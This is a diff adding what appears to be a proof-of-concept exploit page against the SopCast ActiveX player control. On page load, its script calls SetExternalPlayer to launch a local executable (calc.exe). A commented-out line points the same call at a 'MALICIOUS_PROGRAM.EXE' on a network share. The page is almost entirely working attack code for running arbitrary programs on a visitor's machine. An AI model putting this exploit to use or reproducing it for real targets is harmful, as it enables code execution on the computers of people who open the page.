@@ -1,0 +1,24 @@
+<HTML>
+<HEAD>
+<script language="Javascript" type="text/JavaScript">
+window.onload=function()
+{
+SopPlayer.InitPlayer();
+//SopPlayer.SetExternalPlayer("\\\\192.168.0.1\\c$\\PATH\\TO\\MALICIOUS_PROGRAM.EXE");
+SopPlayer.SetExternalPlayer("c:\\WINDOWS\\system32\\calc.exe");
+SopPlayer.SetSopAddress("sop://broker.sopcast.com:3912/6002"); //A LIVE CHANNEL ...
+SopPlayer.SetChannelName("CCTV5");
+SopPlayer.Play();
+}
+</script>
+</HEAD>
+<BODY>
+<OBJECT
+        ID="SopPlayer"
+        name="SopPlayer"
+        CLASSID=clsid:8FEFF364-6A5F-4966-A917-A3AC28411659
+        HEIGHT=375
+        WIDTH=375>
+</OBJECT>
+</BODY>
+</HTML>
